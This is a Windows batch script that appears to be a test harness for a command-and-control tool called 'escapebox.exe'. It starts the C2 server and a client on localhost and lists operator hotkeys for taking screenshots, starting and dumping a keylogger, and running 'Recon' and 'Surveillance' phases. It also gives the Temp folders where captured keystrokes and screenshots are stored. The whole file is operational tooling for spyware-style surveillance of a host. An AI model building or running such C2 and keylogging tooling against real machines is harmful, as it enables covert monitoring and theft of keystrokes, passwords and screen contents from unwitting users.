@echo off
echo ==================================================
echo     C2 FUNCTIONS TEST UTILITY
echo     Testing Screenshots and Keylogger
echo ==================================================
echo.
echo This batch file will test all C2 functions
echo.

REM Check if server is running
echo [1] Checking if C2 server is running...
powershell -Command "Test-NetConnection -ComputerName localhost -Port 443 -WarningAction SilentlyContinue | Select-Object -Property TcpTestSucceeded"
echo.

REM Start server if not running
echo [2] Starting C2 server (if not already running)...
start /B escapebox.exe server
timeout /t 3 >nul
echo.

REM Start client
echo [3] Starting C2 client...
start /B escapebox.exe client 127.0.0.1 443
timeout /t 5 >nul
echo.

echo [4] Server is ready. Use these keyboard shortcuts to test:
echo.
echo     === TESTING COMMANDS ===
echo     Press 'S' - Take Screenshot
echo     Press 'K' - Start Keylogger  
echo     Press 'D' - Dump Keylogger Data
echo     Press '1' - Run Phase 1 (Recon)
echo     Press '4' - Run Phase 4 (Surveillance)
echo     Press 'ESC' - Shutdown Server
echo.
echo [5] After testing, check these locations for output:
echo     Screenshots: C:\Windows\Temp\C2_Screenshots\
echo     Keylogs: C:\Windows\Temp\C2_Keylogs\
echo     Activity Log: C:\Windows\Temp\c2_activity_log.txt
echo.
echo [6] Monitoring activity log for errors...
echo.
powershell -Command "Get-Content -Path 'C:\Windows\Temp\c2_activity_log.txt' -Tail 20 -Wait | Select-String -Pattern 'ERROR|FAILED|SCREENSHOT|KEYLOG'"
